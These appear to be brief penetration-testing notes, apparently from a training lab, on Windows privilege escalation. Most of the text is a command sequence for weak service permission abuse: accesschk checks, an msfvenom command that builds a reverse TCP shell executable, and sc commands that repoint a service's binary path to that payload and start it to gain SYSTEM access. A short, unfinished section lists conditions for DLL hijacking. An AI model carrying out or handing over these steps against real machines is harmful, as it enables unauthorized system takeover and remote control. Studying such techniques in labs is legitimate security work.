#### Service weak permission abuse ####

accesschk64.exe -uwcqv "Authenticated Users" * /accepteula				# check the vulnerable services
accesschk64.exe -vwuc user daclsvc                 # check if user "user" accesses to daclsvc
accesschk64.exe -ucqv daclsvc									# check the vulnerable service's permission

Looking for 
1. SERVICE_CHANGE_CONFIG
2. SERVICE_START
3. SERVICE_STOP


# sc qc daclsvc

# generate payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe


now upload the payload and change the binary_path_name to our payload


sc config daclsvc binpath="C:\Users\Public\shell-x64.exe"

# start the service and easy "system NT"
sc start daclsvc



#### DLL hijack ####

check what dll file the service is calling through processmoinitor
Looking for:
1. dll file in the path where we can read and write
2. the permission to stop and start the service
3. Requires Admin permision


Check if you have permission
accesschk.exe -vwuc user dllsvc                # check if we have permision
whoami /all
